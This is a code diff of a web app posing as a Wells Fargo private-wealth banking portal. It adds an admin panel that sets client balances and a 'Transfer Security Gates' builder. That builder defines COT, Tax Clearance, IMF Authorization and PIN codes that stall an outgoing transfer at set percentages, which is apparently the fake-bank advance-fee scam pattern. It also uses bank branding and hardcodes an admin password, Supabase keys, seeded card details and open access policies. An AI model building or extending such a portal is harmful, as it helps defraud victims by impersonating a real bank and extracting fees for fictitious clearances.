+                  <button type="button" id="quickIssueLoanBtn" class="px-4 py-2 rounded-full bg-white border border-slate-300 hover:border-[#C8102E] hover:text-[#C8102E] text-xs font-semibold text-slate-800 transition-colors">
+                    + Issue New Loan
+                  </button>
+                  <button type="button" id="quickRepayLoanBtn" class="px-4 py-2 rounded-full bg-white border border-slate-300 hover:border-emerald-600 hover:text-emerald-700 text-xs font-semibold text-slate-800 transition-colors">
+                    Record Loan Repayment
+                  </button>
+                  <button type="button" id="quickAllocateInvestBtn" class="px-4 py-2 rounded-full bg-[#C8102E] hover:bg-[#8B0015] text-white text-xs font-semibold transition-colors">
+                    Allocate Investment Funds
+                  </button>
+                </div>
+              </div>
+
+              <form id="adminLoansInvestmentsForm" class="space-y-4" novalidate>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div>
+                    <label for="adminLoanBalanceInput" class="block text-xs font-semibold text-slate-700 mb-1">Active Loan Balance (USD) *</label>
+                    <input type="number" id="adminLoanBalanceInput" min="0" step="0.01" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono tabular-nums" />
+                  </div>
+                  <div>
+                    <label for="adminLoanAprInput" class="block text-xs font-semibold text-slate-700 mb-1">Loan APR (%) *</label>
+                    <input type="number" id="adminLoanAprInput" min="0" max="99" step="0.01" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono tabular-nums" />
+                  </div>
+                  <div>
+                    <label for="adminLoanPaymentDateInput" class="block text-xs font-semibold text-slate-700 mb-1">Next Payment Date *</label>
+                    <input type="date" id="adminLoanPaymentDateInput" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+                  <div>
+                    <label for="adminInvestmentInput" class="block text-xs font-semibold text-slate-700 mb-1">Active Investment Portfolio (USD) *</label>
+                    <input type="number" id="adminInvestmentInput" min="0" step="0.01" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono tabular-nums" />
+                  </div>
+                  <div>
+                    <label for="adminInvestmentYtdInput" class="block text-xs font-semibold text-slate-700 mb-1">YTD Return (%) *</label>
+                    <input type="number" id="adminInvestmentYtdInput" step="0.1" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono tabular-nums" />
+                  </div>
+                </div>
+
+                <div id="adminLoansError" class="hidden rounded-xl border border-red-200 bg-[#FEF2F2] px-4 py-3 text-xs font-medium text-[#8B0015]"></div>
+
+                <div class="flex justify-end">
+                  <button type="submit" class="bg-[#C8102E] hover:bg-[#8B0015] text-white font-semibold text-sm px-6 py-2.5 rounded-full shadow-sm transition-colors">
+                    Save Loans &amp; Investments
+                  </button>
+                </div>
+              </form>
+            </section>
+          </div>
+
+          <!-- TAB 4: TRANSFER SECURITY GATES BUILDER -->
+          <div id="adminTabGates" class="admin-tab-panel hidden space-y-6">
+            <section class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-sm space-y-5">
+              <div class="pb-4 border-b border-slate-200">
+                <h2 class="font-display text-lg font-bold text-slate-900">Transfer Security Gates</h2>
+                <p class="text-xs text-slate-500">Configure dynamic authorization checkpoints (COT, Tax Clearance, IMF Authorization, Security PIN) triggered sequentially during external transfers. Trigger percentages are automatically spaced between 20% and 90%.</p>
+              </div>
+
+              <form id="gateBuilderForm" class="rounded-2xl bg-[#FAF8F6] border border-stone-200 p-4 sm:p-5 space-y-4" novalidate>
+                <div class="flex items-center justify-between gap-2">
+                  <h3 id="gateFormHeading" class="font-display text-sm font-bold text-slate-900">Add Security Verification Gate</h3>
+                  <button type="button" id="cancelGateEditBtn" class="hidden text-xs font-semibold text-slate-600 hover:text-[#C8102E]">Cancel Edit</button>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                  <div>
+                    <label for="gateLabelInput" class="block text-xs font-semibold text-slate-700 mb-1">Step Title / Form Name *</label>
+                    <input type="text" id="gateLabelInput" required placeholder="e.g. Tax Clearance Code" class="w-full rounded-xl border border-slate-300 bg-white px-3.5 py-2.5 text-sm" />
+                  </div>
+                  <div>
+                    <label for="gateCodeInput" class="block text-xs font-semibold text-slate-700 mb-1">Required Verification Code *</label>
+                    <input type="text" id="gateCodeInput" required placeholder="e.g. TAX-9910" class="w-full rounded-xl border border-slate-300 bg-white px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+                  <div>
+                    <label for="gateTypeSelect" class="block text-xs font-semibold text-slate-700 mb-1">Input Type *</label>
+                    <select id="gateTypeSelect" class="w-full rounded-xl border border-slate-300 bg-white px-3.5 py-2.5 text-sm">
+                      <option value="text">Text / Alphanumeric</option>
+                      <option value="pin">Numeric PIN</option>
+                    </select>
+                  </div>
+                </div>
+
+                <div>
+                  <label for="gateDescInput" class="block text-xs font-semibold text-slate-700 mb-1">Prompt Instruction Message *</label>
+                  <input type="text" id="gateDescInput" required placeholder="Enter the clearance code issued by the treasury compliance desk." class="w-full rounded-xl border border-slate-300 bg-white px-3.5 py-2.5 text-sm" />
+                </div>
+
+                <div id="gateBuilderError" class="hidden rounded-xl border border-red-200 bg-[#FEF2F2] px-4 py-2.5 text-xs font-medium text-[#8B0015]"></div>
+
+                <div class="flex justify-end">
+                  <button type="submit" id="gateSubmitBtn" class="bg-[#C8102E] hover:bg-[#8B0015] text-white text-xs sm:text-sm font-semibold px-5 py-2.5 rounded-full shadow-sm transition-colors inline-flex items-center gap-1.5">
+                    <i data-lucide="plus" class="w-4 h-4"></i>
+                    <span>Add Security Gate</span>
+                  </button>
+                </div>
+              </form>
+
+              <div class="space-y-3">
+                <div class="flex items-center justify-between">
+                  <h3 class="font-display text-sm font-bold text-slate-900">Active Verification Sequence (<span id="activeGatesCount">2</span>)</h3>
+                  <span class="text-[11px] text-slate-500">Auto-spaced 20% &ndash; 90% progress triggers</span>
+                </div>
+                <div id="gatesListContainer" class="space-y-3"></div>
+              </div>
+            </section>
+          </div>
+
+          <!-- TAB 5: EMAIL SMTP SETTINGS -->
+          <div id="adminTabSmtp" class="admin-tab-panel hidden space-y-6">
+            <section class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-sm space-y-5">
+              <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-200">
+                <div>
+                  <h2 class="font-display text-lg font-bold text-slate-900">Email SMTP Settings</h2>
+                  <p class="text-xs text-slate-500">Configure outbound alert server settings synced across portal administrator devices.</p>
+                </div>
+                <label class="inline-flex items-center gap-2.5 cursor-pointer select-none">
+                  <input type="checkbox" id="smtpEnabledToggle" class="rounded border-slate-300 text-[#C8102E] focus:ring-[#C8102E] w-4 h-4" />
+                  <span class="text-xs font-semibold text-slate-800">Enable Email Alerts</span>
+                </label>
+              </div>
+
+              <form id="adminSmtpForm" class="space-y-4" novalidate>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div>
+                    <label for="smtpHostInput" class="block text-xs font-semibold text-slate-700 mb-1">SMTP Host</label>
+                    <input type="text" id="smtpHostInput" placeholder="smtp.privatewealth.com" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+                  <div>
+                    <label for="smtpPortInput" class="block text-xs font-semibold text-slate-700 mb-1">SMTP Port</label>
+                    <input type="number" id="smtpPortInput" placeholder="587" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+                  <div>
+                    <label for="smtpEncryptionSelect" class="block text-xs font-semibold text-slate-700 mb-1">Encryption</label>
+                    <select id="smtpEncryptionSelect" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm bg-white">
+                      <option value="TLS">TLS (STARTTLS)</option>
+                      <option value="SSL">SSL</option>
+                      <option value="None">None</option>
+                    </select>
+                  </div>
+                  <div>
+                    <label for="smtpUsernameInput" class="block text-xs font-semibold text-slate-700 mb-1">SMTP Username</label>
+                    <input type="text" id="smtpUsernameInput" placeholder="alerts@privatewealth.com" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+                  <div>
+                    <label for="smtpPasswordInput" class="block text-xs font-semibold text-slate-700 mb-1">SMTP Password</label>
+                    <div class="relative">
+                      <input type="password" id="smtpPasswordInput" placeholder="App password or SMTP secret" class="w-full rounded-xl border border-slate-300 pl-3.5 pr-16 py-2.5 text-sm font-mono" />
+                      <button type="button" id="toggleSmtpPassBtn" class="absolute right-2.5 top-1/2 -translate-y-1/2 text-xs font-semibold text-slate-500 hover:text-slate-900 px-2 py-1">Show</button>
+                    </div>
+                  </div>
+                  <div>
+                    <label for="smtpSenderNameInput" class="block text-xs font-semibold text-slate-700 mb-1">Sender Name</label>
+                    <input type="text" id="smtpSenderNameInput" placeholder="Wells Fargo Treasury Alerts" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+                  </div>
+                  <div class="md:col-span-2 lg:col-span-3">
+                    <label for="smtpSenderEmailInput" class="block text-xs font-semibold text-slate-700 mb-1">Sender Email Address</label>
+                    <input type="email" id="smtpSenderEmailInput" placeholder="treasury-alerts@privatewealth.com" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+                  </div>
+                </div>
+
+                <div id="smtpStatusBanner" class="hidden rounded-xl border px-4 py-3 text-xs font-medium"></div>
+
+                <div class="flex flex-wrap items-center justify-end gap-3 pt-1">
+                  <button type="button" id="sendTestSmtpBtn" class="px-5 py-2.5 rounded-full border border-slate-300 hover:bg-slate-50 text-xs sm:text-sm font-semibold text-slate-700 transition-colors">
+                    Send Test Notification
+                  </button>
+                  <button type="submit" class="bg-[#C8102E] hover:bg-[#8B0015] text-white text-xs sm:text-sm font-semibold px-6 py-2.5 rounded-full shadow-sm transition-colors">
+                    Save SMTP Settings
+                  </button>
+                </div>
+              </form>
+            </section>
+          </div>
+
+          <!-- TAB 6: ADMIN SECURITY -->
+          <div id="adminTabSecurity" class="admin-tab-panel hidden space-y-6">
+            <section class="bg-white border border-slate-200 rounded-2xl p-5 sm:p-6 shadow-sm space-y-5 max-w-2xl">
+              <div class="pb-4 border-b border-slate-200">
+                <h2 class="font-display text-lg font-bold text-slate-900">Admin Security &amp; Credentials</h2>
+                <p class="text-xs text-slate-500">Rotate the Master Admin username and password. Changes synchronize to Supabase and apply immediately on future sign-ons.</p>
+              </div>
+
+              <form id="adminSecurityForm" class="space-y-4" novalidate>
+                <div>
+                  <label for="adminNewUsernameInput" class="block text-xs font-semibold text-slate-700 mb-1">Admin Username *</label>
+                  <input type="text" id="adminNewUsernameInput" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                </div>
+                <div>
+                  <label for="adminCurrentPasswordInput" class="block text-xs font-semibold text-slate-700 mb-1">Current Admin Password *</label>
+                  <input type="password" id="adminCurrentPasswordInput" required placeholder="Verify current password" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                </div>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                  <div>
+                    <label for="adminNewPasswordInput" class="block text-xs font-semibold text-slate-700 mb-1">New Password *</label>
+                    <input type="password" id="adminNewPasswordInput" required placeholder="Minimum 8 characters" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+                  <div>
+                    <label for="adminConfirmPasswordInput" class="block text-xs font-semibold text-slate-700 mb-1">Confirm New Password *</label>
+                    <input type="password" id="adminConfirmPasswordInput" required placeholder="Re-enter new password" class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm font-mono" />
+                  </div>
+                </div>
+
+                <div id="adminSecurityStatus" class="hidden rounded-xl border px-4 py-3 text-xs font-medium"></div>
+
+                <div class="flex justify-end pt-1">
+                  <button type="submit" class="bg-[#C8102E] hover:bg-[#8B0015] text-white text-xs sm:text-sm font-semibold px-6 py-2.5 rounded-full shadow-sm transition-colors">
+                    Update Admin Credentials
+                  </button>
+                </div>
+              </form>
+            </section>
           </div>
         </div>
-
-        <div class="overflow-x-auto">
-          <table class="w-full text-left border-collapse">
-            <thead>
-              <tr class="bg-slate-50 border-b border-slate-200 text-[11px] font-semibold uppercase tracking-wider text-slate-500">
-                <th class="py-3 px-5">Client</th>
-                <th class="py-3 px-4">Credentials</th>
-                <th class="py-3 px-4">Contact</th>
-                <th class="py-3 px-4">Tier &amp; Card</th>
-                <th class="py-3 px-4 text-right">USD Balance</th>
-                <th class="py-3 px-5 text-right">Actions</th>
-              </tr>
-            </thead>
-            <tbody id="adminDirectoryBody" class="divide-y divide-slate-100"></tbody>
-          </table>
-        </div>
-
-        <div id="adminDirectoryEmpty" class="hidden py-10 px-6 text-center text-sm text-slate-500">
-          No client accounts match your directory search.
-        </div>
-      </section>
+      </div>
     </main>
   </div>
 
@@ -1113,13 +1483,14 @@
   <!-- ===================================================================== -->
   <div id="signOnModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/65" role="dialog" aria-modal="true" aria-labelledby="signOnGreeting">
     <div class="w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200">
-      <!-- Crimson Modal Header with Logo Placement -->
+      <!-- Crimson Modal Header with Brand Logo -->
       <div class="bg-[#C8102E] text-white px-6 py-4 border-b-[3px] border-[#F59E0B] flex items-center justify-between gap-4">
-        <div class="flex items-center">
-          <img src="./logo.png" alt="Logo" class="h-9 w-auto object-contain" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
-          <div style="display:none;" class="px-3.5 py-1.5 rounded-lg border border-dashed border-white/75 bg-white/10 text-white text-xs font-bold uppercase tracking-wider">
-            Logo Placement
+        <div class="flex items-center gap-3">
+          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="37" height="40" loading="lazy" decoding="async" class="h-10 w-[37px] rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" />
+          <div style="display:none;" class="px-3 py-1.5 rounded-md border border-white/40 bg-[#8B0015] text-white font-display text-xs font-extrabold uppercase tracking-wider">
+            WELLS FARGO
           </div>
+          <span class="font-display text-sm font-bold tracking-tight text-white">Private Wealth Portal</span>
         </div>
         <button type="button" id="closeSignOnModalBtn" class="text-white/80 hover:text-white p-1.5 rounded-lg transition-colors" aria-label="Close sign on">
           <i data-lucide="x" class="w-5 h-5"></i>
@@ -1190,9 +1561,12 @@
   <div id="transferModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/65" role="dialog" aria-modal="true" aria-labelledby="transferModalTitle">
     <div class="w-full max-w-xl bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200 max-h-[92vh] flex flex-col">
       <div class="bg-[#C8102E] text-white px-6 py-4 border-b-[3px] border-[#F59E0B] flex items-center justify-between gap-4 shrink-0">
-        <div>
-          <h2 id="transferModalTitle" class="font-display text-lg font-bold">External Treasury Disbursement</h2>
-          <p class="text-xs text-red-100" id="txSenderHeader">Originating Account: Timothy Townsend</p>
+        <div class="flex items-center gap-3 min-w-0">
+          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="34" height="36" loading="lazy" decoding="async" class="h-9 w-[34px] rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E] shrink-0" />
+          <div class="min-w-0">
+            <h2 id="transferModalTitle" class="font-display text-lg font-bold truncate">External Treasury Disbursement</h2>
+            <p class="text-xs text-red-100 truncate" id="txSenderHeader">Originating Account: Timothy Townsend</p>
+          </div>
         </div>
         <button type="button" id="closeTransferModalBtn" class="text-white/80 hover:text-white p-1.5 rounded-lg transition-colors" aria-label="Close transfer modal">
           <i data-lucide="x" class="w-5 h-5"></i>
@@ -1262,7 +1636,7 @@
           </form>
         </div>
 
-        <!-- STEP 2: DUAL-GATE PROGRESS & COT / PIN VERIFICATION -->
+        <!-- STEP 2: DYNAMIC MULTI-GATE PROGRESS & VERIFICATION -->
         <div id="transferStep2" class="hidden space-y-5">
           <div class="flex items-start justify-between gap-4 border-b border-slate-200 pb-4">
             <div>
@@ -1282,40 +1656,20 @@
             </div>
           </div>
 
-          <div class="grid grid-cols-4 gap-2 text-center text-[11px]">
-            <div id="stageBadge1" class="rounded-lg py-2 px-1 bg-slate-100 text-slate-600">1. Compliance</div>
-            <div id="stageBadge2" class="rounded-lg py-2 px-1 bg-slate-100 text-slate-600">2. COT Gate</div>
-            <div id="stageBadge3" class="rounded-lg py-2 px-1 bg-slate-100 text-slate-600">3. Security PIN</div>
-            <div id="stageBadge4" class="rounded-lg py-2 px-1 bg-slate-100 text-slate-600">4. Settled</div>
-          </div>
+          <div id="dynamicStageBadges" class="flex flex-wrap gap-2 text-center text-[11px]"></div>
 
-          <!-- COT Gate Panel (45%) -->
-          <div id="cotGatePanel" class="hidden rounded-2xl border border-amber-200 bg-amber-50/60 p-5">
-            <form id="cotForm" class="space-y-3" novalidate>
-              <div class="font-display text-sm font-bold text-slate-900" id="cotPromptTitle">COT Verification Required (45%)</div>
-              <p class="text-xs text-slate-600" id="cotPromptSubtitle">Enter your Certificate of Transfer authorization code to release settlement.</p>
+          <!-- Dynamic Verification Gate Panel -->
+          <div id="dynamicGatePanel" class="hidden rounded-2xl border border-amber-200 bg-amber-50/60 p-5">
+            <form id="dynamicGateForm" class="space-y-3" novalidate>
+              <div class="font-display text-sm font-bold text-slate-900" id="dynamicGateTitle">Security Verification Required</div>
+              <p class="text-xs text-slate-600" id="dynamicGateDescription">Enter your authorization code to continue.</p>
               <div class="flex flex-col sm:flex-row gap-2.5">
-                <input type="text" id="cotInput" placeholder="Enter COT Code" class="flex-1 rounded-xl border border-slate-300 bg-white px-3.5 py-2.5 text-sm font-mono uppercase" />
-                <button type="submit" class="bg-[#C8102E] hover:bg-[#8B0015] text-white text-xs font-semibold px-5 py-2.5 rounded-full whitespace-nowrap">
-                  Verify COT
+                <input type="text" id="dynamicGateInput" placeholder="Enter verification code" class="flex-1 rounded-xl border border-slate-300 bg-white px-3.5 py-2.5 text-sm font-mono" />
+                <button type="submit" id="dynamicGateSubmitBtn" class="bg-[#C8102E] hover:bg-[#8B0015] text-white text-xs font-semibold px-5 py-2.5 rounded-full whitespace-nowrap">
+                  Verify &amp; Continue
                 </button>
               </div>
-              <div id="cotError" class="hidden text-xs font-medium text-[#8B0015]"></div>
-            </form>
-          </div>
-
-          <!-- PIN Gate Panel (75%) -->
-          <div id="pinGatePanel" class="hidden rounded-2xl border border-red-200 bg-[#FEF2F2] p-5">
-            <form id="pinForm" class="space-y-3" novalidate>
-              <div class="font-display text-sm font-bold text-slate-900">Account Security PIN Required (75%)</div>
-              <p class="text-xs text-slate-600">Enter your 4-digit executive treasury PIN to finalize disbursement.</p>
-              <div class="flex flex-col sm:flex-row gap-2.5">
-                <input type="password" id="pinInput" maxlength="8" placeholder="Enter Security PIN" class="flex-1 rounded-xl border border-slate-300 bg-white px-3.5 py-2.5 text-sm font-mono" />
-                <button type="submit" class="bg-[#C8102E] hover:bg-[#8B0015] text-white text-xs font-semibold px-5 py-2.5 rounded-full whitespace-nowrap">
-                  Authorize Release
-                </button>
-              </div>
-              <div id="pinError" class="hidden text-xs font-medium text-[#8B0015]"></div>
+              <div id="dynamicGateError" class="hidden text-xs font-medium text-[#8B0015]"></div>
             </form>
           </div>
         </div>
@@ -1443,6 +1797,68 @@
     </div>
   </div>
 
+  <!-- ===================================================================== -->
+  <!-- MODAL 5: CLIENT SELF-SERVICE PROFILE & SETTINGS MODAL                 -->
+  <!-- ===================================================================== -->
+  <div id="clientProfileModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/65" role="dialog" aria-modal="true" aria-labelledby="clientProfileModalTitle">
+    <div class="w-full max-w-lg bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-200 max-h-[92vh] flex flex-col">
+      <div class="bg-[#C8102E] text-white px-6 py-4 border-b-[3px] border-[#F59E0B] flex items-center justify-between gap-4 shrink-0">
+        <div class="flex items-center gap-3">
+          <img src="/assets/aistudio/Logo_40ef7a99.png" alt="Wells Fargo" width="32" height="34" loading="lazy" decoding="async" class="h-8 w-[32px] rounded-md object-contain shadow-sm ring-1 ring-white/25 bg-[#C8102E]" />
+          <h2 id="clientProfileModalTitle" class="font-display text-base font-bold">Profile &amp; Account Settings</h2>
+        </div>
+        <button type="button" id="closeClientProfileBtn" class="text-white/80 hover:text-white p-1" aria-label="Close profile settings">
+          <i data-lucide="x" class="w-5 h-5"></i>
+        </button>
+      </div>
+
+      <form id="clientProfileForm" class="p-6 space-y-4 overflow-y-auto" novalidate>
+        <div class="flex items-center gap-4 pb-4 border-b border-slate-200">
+          <div class="w-16 h-16 rounded-full border-2 border-red-200 bg-[#FEF2F2] overflow-hidden flex items-center justify-center shrink-0">
+            <img id="profileModalAvatarImg" src="" alt="Profile Photo" class="w-full h-full object-cover hidden" />
+            <span id="profileModalInitials" class="font-display font-bold text-lg text-[#C8102E]">TT</span>
+          </div>
+          <div class="space-y-1.5 min-w-0">
+            <div class="text-xs font-semibold text-slate-900">Profile Picture</div>
+            <div class="flex items-center gap-2">
+              <label for="profileModalPhotoInput" class="cursor-pointer px-3.5 py-1.5 rounded-full bg-[#FEF2F2] hover:bg-red-100 text-xs font-semibold text-[#C8102E] transition-colors">
+                Upload New Photo
+              </label>
+              <input type="file" id="profileModalPhotoInput" accept="image/*" class="hidden" />
+              <span class="text-[11px] text-slate-500">Compressed automatically</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+          <div class="sm:col-span-2">
+            <label for="profileFullNameInput" class="block text-xs font-semibold text-slate-700 mb-1">Full Name *</label>
+            <input type="text" id="profileFullNameInput" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+          </div>
+          <div>
+            <label for="profileEmailInput" class="block text-xs font-semibold text-slate-700 mb-1">Email Address *</label>
+            <input type="email" id="profileEmailInput" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+          </div>
+          <div>
+            <label for="profilePhoneInput" class="block text-xs font-semibold text-slate-700 mb-1">Phone Number *</label>
+            <input type="text" id="profilePhoneInput" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+          </div>
+          <div class="sm:col-span-2">
+            <label for="profileAddressInput" class="block text-xs font-semibold text-slate-700 mb-1">Residential / Mailing Address *</label>
+            <input type="text" id="profileAddressInput" required class="w-full rounded-xl border border-slate-300 px-3.5 py-2.5 text-sm" />
+          </div>
+        </div>
+
+        <div id="profileModalError" class="hidden rounded-xl border border-red-200 bg-[#FEF2F2] px-3.5 py-2.5 text-xs font-medium text-[#8B0015]"></div>
+
+        <div class="flex justify-end gap-2.5 pt-2">
+          <button type="button" id="cancelClientProfileBtn" class="px-4 py-2 rounded-full border border-slate-300 text-xs font-semibold text-slate-700">Cancel</button>
+          <button type="submit" class="bg-[#C8102E] hover:bg-[#8B0015] text-white px-5 py-2 rounded-full text-xs font-semibold shadow-sm">Save Profile Changes</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
   <!-- Toast Banner -->
   <div id="toastBanner" class="hidden fixed bottom-5 right-5 z-50 bg-slate-900 text-white text-xs font-semibold px-4 py-3 rounded-xl shadow-lg border border-slate-700 max-w-sm" role="status" aria-live="polite"></div>
 
@@ -1472,7 +1888,10 @@
         deposit_usd NUMERIC NOT NULL DEFAULT 38450000.00,
         debit_usd NUMERIC NOT NULL DEFAULT 8450000.00,
         investment_usd NUMERIC NOT NULL DEFAULT 12500000.00,
+        investment_ytd NUMERIC NOT NULL DEFAULT 14.2,
         loan_usd NUMERIC NOT NULL DEFAULT 1200000.00,
+        loan_apr NUMERIC NOT NULL DEFAULT 3.85,
+        loan_next_payment TEXT NOT NULL DEFAULT '2026-12-01',
         card_number TEXT NOT NULL,
         card_cvv TEXT NOT NULL,
         card_expiry TEXT NOT NULL,
@@ -1483,8 +1902,26 @@
         created_at TIMESTAMPTZ NOT NULL DEFAULT now()
       );
 
+      -- If upgrading an existing public.clients table, run:
+      -- ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS investment_ytd NUMERIC NOT NULL DEFAULT 14.2;
+      -- ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS loan_apr NUMERIC NOT NULL DEFAULT 3.85;
+      -- ALTER TABLE public.clients ADD COLUMN IF NOT EXISTS loan_next_payment TEXT NOT NULL DEFAULT '2026-12-01';
+
+      CREATE TABLE IF NOT EXISTS public.portal_settings (
+        id TEXT PRIMARY KEY,
+        admin_username TEXT NOT NULL DEFAULT 'master.admin',
+        admin_password TEXT NOT NULL DEFAULT 'AdminMaster2026!',
+        smtp_config JSONB NOT NULL DEFAULT '{}'::jsonb,
+        transfer_gates JSONB NOT NULL DEFAULT '[]'::jsonb,
+        updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
+      );
+
       ALTER TABLE public.clients ENABLE ROW LEVEL SECURITY;
       CREATE POLICY "Allow portal client sync" ON public.clients
+        FOR ALL USING (true) WITH CHECK (true);
+
+      ALTER TABLE public.portal_settings ENABLE ROW LEVEL SECURITY;
+      CREATE POLICY "Allow portal settings sync" ON public.portal_settings
         FOR ALL USING (true) WITH CHECK (true);
     */
 
@@ -1493,8 +1930,8 @@
       const ACCOUNT_USERNAME = "timothy.townsend";
       const ACCOUNT_LAST_NAME = "Townsend";
 
-      const SUPABASE_URL = "YOUR_SUPABASE_PROJECT_URL";
-      const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
+      const SUPABASE_URL = "https://mcgjruyggrrpvvcopfjl.supabase.co";
+      const SUPABASE_ANON_KEY = "sb_publishable_WyRelTOvS-vq6Gf--IMJ3w_FbN6eSfO";
       const ADMIN_USERNAME = "master.admin";
       const ADMIN_PASSWORD = "AdminMaster2026!";
 
@@ -1613,7 +2050,10 @@
           deposit_usd: 38450000.0,
           debit_usd: 8450000.0,
           investment_usd: 12500000.0,
+          investment_ytd: 14.2,
           loan_usd: 1200000.0,
+          loan_apr: 3.85,
+          loan_next_payment: "2026-12-01",
           card_number: "5399482011934829",
           card_cvv: "842",
           card_expiry: "09/29",
@@ -1635,10 +2075,24 @@
 
       function normalizeClientRecord(raw) {
         var seed = createSeedTimothyTownsend();
-        var txList = Array.isArray(raw && raw.transactions_json) ? raw.transactions_json : [];
+        var rawTx = raw && raw.transactions_json;
+        if (typeof rawTx === "string") {
+          try {
+            rawTx = JSON.parse(rawTx);
+          } catch (e) {
+            rawTx = [];
+          }
+        }
+        var txList = Array.isArray(rawTx) ? rawTx : [];
+        var uname = String((raw && raw.username) || "").trim().toLowerCase();
+        if (txList.length === 0 && uname === ACCOUNT_USERNAME) {
+          txList = seed.transactions_json;
+        }
+        var hasInvYtd = raw && raw.investment_ytd !== undefined && raw.investment_ytd !== null && Number.isFinite(Number(raw.investment_ytd));
+        var hasLoanApr = raw && raw.loan_apr !== undefined && raw.loan_apr !== null && Number.isFinite(Number(raw.loan_apr));
         return {
           id: String((raw && raw.id) || ("client-" + Date.now())),
-          username: String((raw && raw.username) || "").trim().toLowerCase(),
+          username: uname,
           password: String((raw && raw.password) || ""),
           full_name: String((raw && raw.full_name) || ACCOUNT_HOLDER).trim(),
           email: String((raw && raw.email) || "").trim(),
@@ -1651,7 +2105,10 @@
           deposit_usd: Number(raw && raw.deposit_usd) || 0,
           debit_usd: Number(raw && raw.debit_usd) || 0,
           investment_usd: Number(raw && raw.investment_usd) || 0,
+          investment_ytd: hasInvYtd ? Number(raw.investment_ytd) : 14.2,
           loan_usd: Number(raw && raw.loan_usd) || 0,
+          loan_apr: hasLoanApr ? Number(raw.loan_apr) : 3.85,
+          loan_next_payment: String((raw && raw.loan_next_payment) || "2026-12-01").trim() || "2026-12-01",
           card_number: String((raw && raw.card_number) || seed.card_number).replace(/\D/g, "") || seed.card_number,
           card_cvv: String((raw && raw.card_cvv) || "842"),
           card_expiry: String((raw && raw.card_expiry) || "09/29"),
@@ -1663,13 +2120,128 @@
         };
       }
 
-      function authenticatePortal(usernameInput, passwordInput, clients) {
+      function createDefaultPortalSettings() {
+        return {
+          id: "global",
+          admin_username: ADMIN_USERNAME,
+          admin_password: ADMIN_PASSWORD,
+          smtp_config: {
+            host: "",
+            port: 587,
+            encryption: "TLS",
+            username: "",
+            password: "",
+            sender_name: "Wells Fargo Treasury Alerts",
+            sender_email: "alerts@privatewealth.com",
+            enabled: false,
+          },
+          transfer_gates: [
+            {
+              id: "gate_cot",
+              label: "Certificate of Transfer (COT)",
+              code: "COT-8842",
+              inputType: "text",
+              stopAtPercent: 45,
+              description: "Enter your assigned Certificate of Transfer clearance code.",
+            },
+            {
+              id: "gate_pin",
+              label: "Account Security PIN",
+              code: "2026",
+              inputType: "pin",
+              stopAtPercent: 75,
+              description: "Enter your 4-digit private banking security PIN.",
+            },
+          ],
+          updated_at: "2026-01-10T09:00:00.000Z",
+        };
+      }
+
+      function rebalanceTransferGates(gates) {
+        var list = Array.isArray(gates) ? gates : [];
+        var n = list.length;
+        return list.map(function (g, idx) {
+          var pct = 55;
+          if (n > 1) {
+            pct = Math.round(20 + (idx * 70) / (n - 1));
+          }
+          return {
+            id: String((g && g.id) || ("gate_" + (idx + 1))),
+            label: String((g && g.label) || "Verification Gate").trim(),
+            code: String((g && g.code) || "").trim(),
+            inputType: g && g.inputType === "pin" ? "pin" : "text",
+            stopAtPercent: pct,
+            description: String((g && g.description) || "Enter your assigned authorization code.").trim(),
+          };
+        });
+      }
+
+      function normalizePortalSettings(raw) {
+        var defaults = createDefaultPortalSettings();
